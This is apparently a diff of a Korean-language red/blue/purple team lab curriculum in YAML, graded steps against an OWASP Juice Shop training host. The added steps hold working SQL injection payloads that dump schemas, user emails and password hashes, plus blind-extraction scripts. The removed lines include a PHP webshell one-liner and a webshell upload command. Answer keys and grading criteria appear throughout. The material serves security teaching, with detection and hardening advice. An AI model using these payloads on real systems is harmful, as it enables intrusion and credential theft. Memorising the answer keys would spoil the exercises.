-    payload encoding. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: Content-Type 변조 업로드 관련 도구와 기법을 활용하세요.
-  category: bypass
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo ''Content-Type
-    변조 업로드 완료'''
-  answer_detail: Content-Type 변조 업로드은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ```bash
+    # 1. CREATE TABLE SQL 전체 (sqlite_master 의 sql 컬럼)
+    echo "=== 1. 전체 schema dump ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print('---') or print(p.get('id',p)) for p in d.get('data',[])[:5]]" 2>/dev/null
+
+    # 2. Users 테이블 만 (특정 테이블 schema)
+    echo ""
+    echo "=== 2. Users 테이블 schema ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" \
+      | head -20
+
+    # 3. PRAGMA 활용 (table_info 로 컬럼 list)
+    echo ""
+    echo "=== 3. PRAGMA table_info(Users) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p.get(\"id\")}: {p.get(\"name\")}') for p in d.get('data',[])[:15]]" 2>/dev/null
+    ```
+
+    ## 📋 확인 사항
+
+    - Users 의 schema = `CREATE TABLE Users(id INTEGER PRIMARY KEY, email TEXT,
+      password TEXT, role TEXT, deluxeToken TEXT, lastLoginIp TEXT, profileImage
+      TEXT, totpSecret TEXT, ...)` 형식
+    - 9 컬럼 (STEP 2 ORDER BY 와 일치) → UNION SELECT 의 9 NULL placeholder
+    - PRAGMA table_info 응답 의 컬럼 list (id/name/type/notnull/dflt/pk)
+    - sqlite_master 의 type 컬럼: 'table' / 'index' / 'view' / 'trigger'
+
+    ## 💡 왜 이걸 하는가?
+
+    schema dump 는 SQL Injection 의 *확인 단계* 의 핵심 (MITRE T1213 Data
+    from Information Repositories). CREATE TABLE SQL 직접 노출로 모든 컬럼명
+    + 타입 파악 → 다음 STEP 의 password hash dump 의 정확한 컬럼 (`password`)
+    매핑. PRAGMA 명령은 SQLite 의 metadata 직접 query → information_schema
+    의 SQLite 버전.
+
+    ## 🔵 Blue 측 관찰
+
+    UNION SELECT + sqlite_master / pragma_table_info 시도는 ModSecurity CRS
+    rule 942270 (SQL Injection in args) + 942150 (SQL UNION Attack) 의 직접
+    트리거. 5 회 burst 시 active-response. Wazuh rule 100002 (ModSec SQL
+    Injection) 의 severity high 인입.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: `findAll()` 의 attributes whitelist 강제 (`attributes:
+      ['id','name','description']` 만) + raw 옵션 거부
+    - Express: query param 의 SQL keyword 패턴 grep + 사전 거부
+      (`UNION|SELECT|FROM|sqlite|pragma|information_schema`)
+    - ModSecurity CRS PARANOIA LEVEL 3 (rule 942270 / 942280 enable)
+    - 학습 환경 default = challenge 보존
+  hint: |
+    UNION SELECT 의 컬럼 수 = Juice Shop /rest/products/search 의 9 컬럼.
+    sqlite_master 의 sql 컬럼 = CREATE TABLE SQL 그대로. PRAGMA table_info(table)
+    은 SQLite 의 information_schema 등가.
+  category: sqli_union
+  points: 15
+  answer: |
+    echo "=== 1. 전체 schema dump (sqlite_master) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
+    echo ""
+    echo "=== 2. Users 테이블 schema 만 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20AND%20name=%27Users%27--" | head -10
+    echo ""
+    echo "=== 3. PRAGMA table_info(Users) — 컬럼 list ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
+  answer_detail: |
+    Juice Shop 의 Users schema = (id, username, email, password, role, deluxeToken,
+    lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt).
+    password 는 MD5 hash 저장 (의도된 weak — Juice Shop challenge). role 컬럼
+    값 = 'admin' / 'deluxe' / 'accounting' / 'customer'. 다음 STEP 의 UNION
+    SELECT email, password, role 의 입력.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - harset
-    - utf-8
+    expect: 'CREATE TABLE\|Users\|sqlite_master'
     field: stdout
     semantic:
-      intent: Content-Type 변조 — 악성 파일을 image/jpeg MIME 으로 전송해 MIME 검증 우회
+      intent: |
+        UNION SELECT 로 sqlite_master schema 직접 dump + PRAGMA table_info
+        로 컬럼 list 추출. MITRE T1213 + OWASP A03. 다음 STEP 의 정확한
+        컬럼명 매핑 입력.
       success_criteria:
-      - Content-Type 헤더를 image/jpeg 등으로 조작한 업로드
-      - 실제 확장자(.php) 와 MIME 불일치 상황 구현
-      - 파일 매직 바이트 검증의 필요성 언급
+        - UNION SELECT FROM sqlite_master 시도 + 응답 인용
+        - 최소 1 테이블 의 schema (CREATE TABLE SQL) 직접 발견
+        - PRAGMA table_info 또는 동등 SQLite metadata query 시도
+        - 9 컬럼 (Products) 매핑 확인 (UNION 의 NULL placeholder 수)
       acceptable_methods:
-      - curl -F "file=@shell.php;type=image/jpeg"
-      - Burp Repeater 로 Content-Type 수정
-      - python requests files=(name, file, type)
-      - wfuzz 로 MIME fuzzing
+        - "UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master"
+        - "UNION SELECT name,type,... FROM pragma_table_info('Users')"
+        - "sqlmap -u '...' --batch --tables --columns"
+        - "sqlmap --dump-all (자동화)"
       negative_signs:
-      - Content-Type 조작 없음
-      - MIME 불일치 개념 부재
-      - 매직 바이트 언급 없음
+        - sqlite_master / pragma 미시도
+        - schema dump 응답 인용 누락
+        - 컬럼 수 매핑 (9 컬럼) 설명 누락
   target_vm: attacker
-  script: curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo 'Content-Type
-    변조 업로드 완료'
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20name,type,3,4,5,6,7,8,9%20FROM%20pragma_table_info(%27Users%27)--" | head -20
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 Content-Type 변조 업로드을(를) 수행해줘
-
-
-    [도구 권장] bypass: wafw00f, sqlmap --tamper, xsstrike payload encoding. curl 만 쓰지
-    말고 **wafw00f** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 UNION SELECT 로 schema 직접 dump — (1) sqlite_master 의 sql 컬럼 으로
+    모든 CREATE TABLE SQL (2) Users 테이블 schema 특정 (3) PRAGMA table_info(Users)
+    로 컬럼 list. 9 컬럼 매핑 + Users schema (email/password/role 등) 직접
+    인용. 다음 STEP password hash dump 의 입력. MITRE T1213 + ModSec CRS 942150/942270.
+# ============================================================
+# STEP 5 [RED·SQLi·UNION·Dump] — Users 테이블 의 email + password hash 직접 추출
+# ============================================================
 - order: 5
-  instruction: '{{WEB_IP}} 대상으로 매직 바이트 조작 업로드을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 4 에서 발견한 Users schema (email / password / role) 기반 — UNION
+    SELECT 로 Users 테이블 전체 dump. (a) email + password hash (b) role 별
+    필터 (admin / deluxe) (c) hash 형식 식별 (MD5 길이 32 / bcrypt $2b$ /
+    SHA256 64). Juice Shop 의 의도된 MD5 (학습용 weak hash) 노출 → 다음 STEP
+    의 rainbow table / hashcat crack 입력.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `bypass` 에 적합한 도구: wafw00f, sqlmap --tamper, xsstrike
-    payload encoding. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 매직 바이트 조작 업로드 관련 도구와 기법을 활용하세요.
-  category: bypass
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo ''매직 바이트
-    조작 업로드 완료'''
-  answer_detail: 매직 바이트 조작 업로드은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ```bash
+    # 1. Users 전체 dump (email + password)
+    echo "=== 1. Users 전체 dump ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f'  {p.get(\"id\",\"\"):30s} | {p.get(\"name\",\"\")}') for p in d.get('data',[])[:15]]" 2>/dev/null \
+      || curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+
+    # 2. admin role 만 필터
+    echo ""
+    echo "=== 2. admin role 만 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,role,4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -15
+
+    # 3. hash 형식 식별 (한 hash 의 길이 + prefix 패턴)
+    echo ""
+    echo "=== 3. hash 형식 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20LIMIT%201--" | head -10
+    ```
+
+    ## 📋 확인 사항
+
+    - Users 전체 dump 의 row 수 (Juice Shop default = 21 row)
+    - admin@juice-sh.op 의 password hash (예상: `0192023a7bbd73250516f069df18b500` —
+      MD5 32 자 = `admin123`)
+    - hash 길이 32 → MD5 (Juice Shop 의 의도된 weak), 60 → bcrypt $2b$, 64 → SHA256
+    - role 컬럼 의 값 분포 (admin / deluxe / accounting / customer)
+
+    ## 💡 왜 이걸 하는가?
+
+    Credential dump 는 SQL Injection 의 *최종 목표 중 하나* (MITRE T1003.008
+    OS Credential Dumping + T1552.001 Credentials in Files). 추출한 hash 는
+    오프라인 cracking 가능 — MD5 의 admin123 같은 약한 password 는 rainbow
+    table (CrackStation) 즉시 해독. Juice Shop 의 challenge 는 MD5 → 학습용
+    weak 표본. 운영 web 이라면 bcrypt + salt 필수.
+
+    ## 🔵 Blue 측 관찰
+
+    UNION SELECT FROM Users + email/password 컬럼 시도는 ModSecurity CRS
+    rule 942150 (UNION) + 942270 (SQL Injection in args) 의 트리거. Wazuh
+    의 *high severity* alert (rule 100002 + level 12+). 응답에 hash 직접
+    노출 시 Wazuh + DLP (Data Loss Prevention) 룰 추가 필요 — 응답 body 의
+    `[a-f0-9]{32,64}` 패턴 grep + alert.
+
+    ## 🟣 Purple 보완 권장
+
+    - **password storage**: MD5 / SHA1 즉시 deprecated → bcrypt (`bcrypt.hash(pw, 12)`)
+      또는 argon2 (CPU + memory hard)
+    - Sequelize: Users.findAll() 의 attributes whitelist (`['id','email','role']` 만,
+      password 제외)
+    - **Express 응답 sanitize**: serializer 단에서 password 필드 자동 제거
+      (`toJSON()` override)
+    - ModSecurity CRS PARANOIA LEVEL 3 + 응답 body inspection 활성화 (`SecResponseBodyAccess
+      On`) → hash 패턴 검출 시 alert + 응답 차단
+    - Wazuh DLP custom rule — hash 패턴 응답 burst 시 immediate active-response
+  hint: |
+    UNION SELECT 의 컬럼 매핑 — Products 응답 9 컬럼 중 첫 2 컬럼 (id/name) 자리에
+    email/password 로 substitute. role 필터 추가 시 `WHERE role='admin'`. hash
+    길이 `LENGTH(password)` 로 형식 식별.
+  category: sqli_union
+  points: 15
+  answer: |
+    echo "=== 1. Users 전체 dump (email + password hash) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+    echo ""
+    echo "=== 2. admin role 만 + hash 형식 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
+  answer_detail: |
+    Juice Shop default Users dump = admin@juice-sh.op + 0192023a7bbd73250516f069df18b500
+    (MD5 = admin123). 21 row 의 default user — admin / jim@juice-sh.op /
+    bender@juice-sh.op / bjoern* 등. 모두 MD5 hash (의도된 weak — 학습용).
+    rainbow table (CrackStation) 즉시 cracking. PII 노출 + GDPR Article 32
+    "기술적 조치" 위반 시나리오.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'juice-sh.op\|@\|admin'
     field: stdout
     semantic:
-      intent: 매직 바이트 조작 — JPEG/PNG/GIF 헤더(FFD8FF, 89504E47, 474946) 를 파일 시작에 추가해 매직
-        검증 우회
+      intent: |
+        UNION SELECT 로 Users 테이블 의 email + password hash 직접 dump.
+        hash 형식 (MD5/bcrypt/SHA256) 식별 + admin role 필터. MITRE T1003.008 +
+        T1552.001 + OWASP A02 Cryptographic Failures + A03 Injection 의 결합.
       success_criteria:
-      - 매직 바이트 + PHP 코드 결합 파일 생성
-      - file 명령 또는 hexdump 로 매직 확인
-      - 매직 바이트 검증만으로 불충분한 이유 설명
+        - UNION SELECT FROM Users + email + password 컬럼 시도
+        - 최소 1 row (admin 또는 다른 user) 의 email + hash 인용
+        - hash 형식 식별 (MD5 32 자 / bcrypt 60 / SHA256 64)
+        - PII / GDPR 위험 또는 password storage 약점 (MD5) 언급
       acceptable_methods:
-      - <SENSITIVE:9bc6f7b72c79499e>
-      - exiftool 로 EXIF 주입
-      - python 으로 이진 파일 생성
-      - imagemagick 변환 악용
+        - "UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users"
+        - "sqlmap -u '...?q=*' --batch --dump -T Users -C email,password"
+        - "sqlmap --batch --dbs --tables --columns 자동화"
+        - "WHERE role='admin' + LENGTH(password) hash 형식 식별"
       negative_signs:
-      - 매직 바이트 주입 없음
-      - 검증 우회 설명 없음
-      - file 로 매직 확인 누락
+        - UNION 의 컬럼 매핑 시도 안 함
+        - 응답에서 email/hash 인용 누락
+        - hash 형식 (MD5/bcrypt) 식별 누락
   target_vm: attacker
-  script: curl -sI http://10.20.32.80 2>/dev/null | head -10 && echo '매직 바이트 조작 업로드
-    완료'
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" | head -30
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20email,password,LENGTH(password),4,5,6,7,8,9%20FROM%20Users%20WHERE%20role=%27admin%27--" | head -10
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 매직 바이트 조작 업로드을(를) 수행해줘
-
-
-    [도구 권장] bypass: wafw00f, sqlmap --tamper, xsstrike payload encoding. curl 만 쓰지
-    말고 **wafw00f** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 UNION SELECT 로 Users 테이블 dump — (1) email + password hash 전체 (2)
+    admin role 만 필터 + LENGTH(password) 로 hash 형식 식별. 최소 1 row 의
+    email + hash 직접 인용 (예: admin@juice-sh.op + 32 자 MD5). PII / GDPR /
+    OWASP A02 (MD5 weak hash) 매핑 한 줄. Purple = bcrypt/argon2 + Sequelize
+    attributes whitelist + ModSec 응답 body inspection 권장.
+# ============================================================
+# STEP 6 [RED·SQLi·Blind·Boolean] — 참/거짓 응답 길이 차이로 한 글자씩 추출
+# ============================================================
 - order: 6
-  instruction: '{{WEB_IP}} 대상으로 웹쉘 업로드 시도을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Error-based / UNION 이 차단된 환경 (Blue 의 ModSec 룰 활성화) 가정 →
+    응답 본문 직접 노출 없이 *참/거짓 조건 의 응답 길이 차이* 로 한 비트씩
+    추출. attacker 컨테이너 에서 (a) 참/거짓 baseline 차이 측정 → (b) SUBSTR
+    + ASCII 로 admin 의 password hash 첫 글자 식별 → (c) 자동화 스크립트 로
+    32 자 전체 추출 데모.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
-    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 웹쉘 업로드 시도 관련 도구와 기법을 활용하세요.
-  category: exploit
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 참 vs 거짓 baseline (응답 본문 길이 차이)
+    echo "=== 1. 참/거짓 baseline ==="
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
+    echo "1=1 → len=${LEN_TRUE}, 1=2 → len=${LEN_FALSE}"
+    echo "차이: $((LEN_TRUE - LEN_FALSE)) bytes"
+
+    # 2. admin password hash 첫 글자 추출 (binary search 시연)
+    echo ""
+    echo "=== 2. admin password hash[1] 식별 ==="
+    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
+      [ "$len" = "$LEN_TRUE" ] && echo "  hash[1]='${c}' (응답 len ${LEN_TRUE} = TRUE)"
+    done
+
+    # 3. 자동화 스크립트 — 첫 5 자
+    echo ""
+    echo "=== 3. 자동 binary search (첫 5 자) ==="
+    python3 <<'PYEOF'
+    import urllib.request
+    BASE = "http://juice.6v6.lab/rest/products/search?q="
+    LEN_TRUE = len(urllib.request.urlopen(BASE + "qwert%27))%20AND%201=1--").read())
+    extracted = ""
+    for pos in range(1, 6):
+        for c in "0123456789abcdef":
+            payload = f"qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),{pos},1)=%27{c}%27--"
+            n = len(urllib.request.urlopen(BASE + payload).read())
+            if n == LEN_TRUE:
+                extracted += c
+                break
+    print(f"추출된 hash 첫 5 자: {extracted}")
+    PYEOF
+    ```
+
+    ## 📋 확인 사항
+
+    - 참 조건 (1=1) 응답 길이 vs 거짓 조건 (1=2) 응답 길이 차이 (예: 2300 vs 32)
+    - admin password hash 첫 글자 식별 (예상: `0` — `0192023a7bbd...` MD5)
+    - 자동화 스크립트 의 32 자 추출 시간 (16 자 × 32 회 = 512 요청, 약 5 분)
+    - SUBSTR / ASCII / UNICODE 함수 의 SQLite 지원 (모두 지원)
+
+    ## 💡 왜 이걸 하는가?
+
+    Blind SQLi 는 *에러 노출 없는 환경* (ModSecurity / 응답 sanitize / production
+    error handling) 에서도 작동 (OWASP A03 + MITRE T1190). 응답 본문 한 비트
+    (TRUE/FALSE) 만 누설되어도 충분 — binary search 로 효율적 추출. sqlmap 의
+    `--technique=B` 가 동일 로직 자동화. Juice Shop 의 default 응답에서 row
+    유무로 길이 차이 발생 → Blind 가능 신호.
+
+    ## 🔵 Blue 측 관찰
+
+    Blind SQLi 의 burst (한 글자 당 16 요청 × 32 자 = 512 요청 / 5 분) 패턴은
+    ModSecurity CRS rule 942100 (SQL Injection libinjection) + 920400 (Excessive
+    request) 동시 트리거. Wazuh rule 31108 (Excessive Web 400/500 from src) +
+    rule 100002 (ModSec alert) 의 burst escalation. siem 의 alerts.json 에 다수
+    인입 → active-response 자동 차단.
+
+    ## 🟣 Purple 보완 권장
+
+    - **응답 길이 균일화**: 모든 응답을 fixed-length (예: 정상/에러 모두 32 byte
+      JSON `{"data":[],"status":"success"}` ) → Boolean 신호 차단
+    - **rate-limit**: HAProxy stick-table 또는 express-rate-limit 으로 5 req/sec
+      이상 src IP 차단 → 512 요청 burst 불가
+    - **응답 시간 균일화**: `setTimeout(resp, 200)` 으로 모든 응답 최소 200ms →
+      timing-based Blind 도 동시 차단
+    - ModSecurity CRS PARANOIA LEVEL 3 + SUBSTR/SUBSTRING/ASCII 키워드 사전 거부
+  hint: |
+    참/거짓 응답 길이 차이가 1 byte 이상이면 Blind 가능. binary search 알고리즘
+    = 첫 글자 후보 16 (0-9a-f) → 32 자 hash = 16 × 32 = 512 요청. sqlmap 의
+    `--technique=B` 가 자동화.
+  category: sqli_blind
   points: 12
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 웹쉘 업로드 시도을(를) 수행해줘
-
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''웹쉘 업로드
-    시도 완료'''
-  answer_detail: 웹쉘 업로드 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== 1. 참/거짓 baseline ==="
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
+    echo "1=1 → ${LEN_TRUE} bytes, 1=2 → ${LEN_FALSE} bytes (차이: $((LEN_TRUE - LEN_FALSE)))"
+    echo ""
+    echo "=== 2. admin password hash 첫 글자 식별 ==="
+    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
+      [ "$len" = "$LEN_TRUE" ] && echo "hash[1]='${c}' (TRUE)"
+    done
+  answer_detail: |
+    Blind Boolean SQLi 의 핵심 = 응답 길이 차이로 한 비트 (TRUE/FALSE) 누설.
+    Juice Shop 의 1=1 응답은 ~2300 bytes (product list), 1=2 는 ~32 bytes (빈 list)
+    → 차이 명백. admin password MD5 (0192023a...) 의 첫 글자 = '0' 식별. sqlmap
+    --technique=B 가 동일 알고리즘 자동화 (수 분 내 32 자 추출).
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'bytes\|TRUE\|len'
     field: stdout
     semantic:
-      intent: 웹쉘 업로드 — PHP/JSP/ASP 웹쉘 파일을 다양한 확장자로 업로드 시도 후 서버 실행 여부 확인
+      intent: |
+        Blind Boolean SQLi — 참/거짓 응답 길이 차이로 비트 누설. SUBSTR +
+        binary search 로 admin password hash 추출. ModSec / 응답 sanitize
+        환경에서도 작동. OWASP A03 + MITRE T1190.
       success_criteria:
-      - 단순 한 줄 웹쉘 (system/passthru/shell_exec) 파일 생성
-      - 여러 확장자(.phtml, .phar, .php7) 로 업로드 시도
-      - 업로드 후 URL 로 실행 시도와 결과 판정
+        - 참(1=1) vs 거짓(1=2) 응답 길이 차이 측정 + 인용
+        - SUBSTR 또는 ASCII 로 한 글자 추출 시도
+        - 응답 길이 매칭 으로 TRUE 판정 알고리즘 설명
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - echo php webshell > shell.phtml
-      - weevely generate <password> shell.php
-      - <SENSITIVE:334cc5eb0eba15b3>
-      - JSP/ASPX 웹쉘 변종
+        - "curl 응답 wc -c + 참/거짓 비교"
+        - "for-loop 16 후보 + SUBSTR(...,pos,1)"
+        - "sqlmap -u '...?q=*' --batch --technique=B"
+        - "python urllib.request + binary search 자동화"
       negative_signs:
-      - 웹쉘 없이 단순 이미지만 업로드
-      - 실행 경로 확인 없음
-      - 확장자 변형 없음
+        - 참/거짓 응답 길이 비교 누락
+        - 한 글자 추출 알고리즘 (SUBSTR + binary search) 설명 없음
+        - sqlmap 또는 자동화 도구 미언급
   target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '웹쉘 업로드 시도 완료'
-  risk_level: medium
-  bastion_prompt: '10.20.32.80 대상으로 웹쉘 업로드 시도을(를) 수행해줘
-
-
-
-
-    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
-    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
-
-
-    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+  script: |
+    LEN_TRUE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=1--" | wc -c)
+    LEN_FALSE=$(curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%201=2--" | wc -c)
+    echo "1=1 → ${LEN_TRUE}, 1=2 → ${LEN_FALSE} (diff=$((LEN_TRUE - LEN_FALSE)))"
+    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
+      payload="qwert%27))%20AND%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27--"
+      len=$(curl -s "http://juice.6v6.lab/rest/products/search?q=${payload}" | wc -c)
+      [ "$len" = "$LEN_TRUE" ] && echo "hash[1]='${c}' TRUE"
+    done
+  risk_level: low
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 Blind Boolean SQLi 시도 — (1) 참(1=1) vs 거짓(1=2) 응답 길이 차이 측정
+    (2) SUBSTR + for-loop 16 후보 로 admin password hash 첫 글자 식별. 응답
+    길이 매칭 으로 TRUE 판정 알고리즘 설명 + sqlmap --technique=B 자동화
+    언급. Purple = 응답 길이 균일화 + rate-limit + 시간 균일화 + CRS PL3.
+# ============================================================
+# STEP 7 [RED·SQLi·Blind·Time] — Time-based (RANDOMBLOB / 무거운 CASE) 응답 지연
+# ============================================================
 - order: 7
-  instruction: '{{WEB_IP}} 대상으로 이미지 파일 내 코드 삽입을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Blind Boolean 도 차단된 환경 (응답 길이 균일화) 가정 → *응답 시간 차이*
+    로 비트 누설. SQLite 의 RANDOMBLOB(N) 으로 N 바이트 random 생성 시간이
+    조건 참 일 때만 trigger → 응답 지연 측정. 학습용 짧은 N (10^7 ~ 10^8).
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
-    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 이미지 파일 내 코드 삽입 관련 도구와 기법을 활용하세요.
-  category: exploit
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 이미지 파일 내 코드 삽입을(를) 수행해줘
+    ## 💻 실행 명령
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''이미지 파일
-    내 코드 삽입 완료'''
-  answer_detail: 이미지 파일 내 코드 삽입은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - exiftool
-    field: stdout
-    semantic:
-      intent: 이미지에 코드 주입 — exiftool 로 EXIF Comment 에 PHP 코드 삽입 또는 파일 끝에 코드 append
-        후 .php.jpg 업로드
-      success_criteria:
-      - exiftool -Comment=php code 로 이미지 메타데이터 주입
-      - file 명령으로 정상 이미지 인식 확인
-      - PHP include 로 이미지 실행 시 코드 동작 개념 설명
-      acceptable_methods:
-      - exiftool -Comment=\"<?php system($_GET[cmd]); ?>\" img.jpg
-      - cat img.jpg code.php > hybrid.jpg.php
-      - stegosploit 프레임워크 언급
-      - PIL/Pillow 로 이미지에 주입
-      negative_signs:
-      - 메타데이터 주입 없음
-      - PHP include 연결 없음
-      - 정상 이미지 유지 확인 없음
-  target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '이미지 파일 내 코드 삽입
-    완료'
-  risk_level: medium
-  bastion_prompt: '10.20.32.80 대상으로 이미지 파일 내 코드 삽입을(를) 수행해줘
+    ```bash
+    # 1. baseline (조건 거짓 — 즉시 응답)
+    echo "=== 1. 거짓 baseline (RANDOMBLOB 안 실행) ==="
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
 
